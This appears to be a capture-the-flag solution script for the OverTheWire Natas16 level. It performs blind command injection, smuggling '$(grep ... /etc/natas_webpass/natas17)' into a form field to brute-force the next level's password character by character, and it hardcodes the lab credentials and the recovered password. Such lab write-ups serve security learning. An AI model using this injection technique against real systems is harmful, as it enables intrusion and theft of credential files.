import requests
import string,re
import time
import re
from itertools import product

url="http://natas16.natas.labs.overthewire.org/"

username="natas16"
password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
header={"Content-Type": "image/jpeg"};
look=string.printable
pas=[]
count=0
vocabulaire=string.digits+string.ascii_uppercase+string.ascii_lowercase

while(True):
    for x in vocabulaire:
        r = requests.post(url, data={'needle': 'hello$(grep ^'+''.join(pas)+x+' /etc/natas_webpass/natas17)'},auth=(username, password))
        d = r.text
        if re.findall('hello',r.text):
            print('waiting..',''.join(pas)+x)
        else:
            pas+=[x]
            print('find on more',''.join(pas))
# the password natas17 : 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
